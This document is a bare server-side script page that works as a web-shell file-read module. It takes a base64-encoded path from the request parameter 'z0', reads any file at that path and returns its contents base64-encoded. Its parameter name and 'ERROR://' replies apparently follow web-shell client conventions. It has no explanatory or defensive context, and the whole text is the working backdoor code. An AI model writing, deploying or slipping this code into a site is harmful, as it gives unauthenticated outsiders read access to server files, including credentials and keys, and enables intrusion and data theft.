<%

var paramMap = request.getParameterMap();
var szFilePath = "";

if (paramMap.containsKey("z0")) {
    var z0 = paramMap.get("z0")[0];
    if (z0 != null && z0 != "") {
        var clean = z0.replace(/ /g, "+");
        var decodedBytes = java.util.Base64.getDecoder().decode(clean);
        
        szFilePath = new java.lang.String(decodedBytes, "UTF-8");
    }
}

if (szFilePath == "") {
    echo("ERROR://Unable to open file.");
} else {
    try {
        var path = java.nio.file.Paths.get(szFilePath);
        if (java.nio.file.Files.exists(path) && !java.nio.file.Files.isDirectory(path)) {
            var fileBytes = java.nio.file.Files.readAllBytes(path);
            var b64Result = java.util.Base64.getEncoder().encodeToString(fileBytes);
            
            echo(b64Result);
        } else {
            echo("ERROR://Unable to open file.");
        }
    } catch (e) {
        echo("ERROR://Unable to open file.");
    }
}

%>